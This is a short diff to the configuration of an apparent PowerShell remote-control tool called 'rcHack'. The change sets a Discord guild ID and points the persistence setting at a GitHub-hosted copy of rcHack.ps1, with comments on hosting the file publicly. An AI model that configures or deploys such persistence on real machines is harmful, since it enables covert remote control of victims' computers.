@@ -12,7 +12,7 @@ $guildId = "1230467843225554965"
 #put the url to your rcHack script (for persistance)
 #you can host the file on github (make sure the repository is public)
 #example: $StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIPT.PS1"
-$StartupPsOnlineFileLocation = "https://github.com/m3lv15/Kemgna/upload"
+$StartupPsOnlineFileLocation = "https://github.com/m3lv15/Kemgna/blob/main/rcHack.ps1"
 
 
 
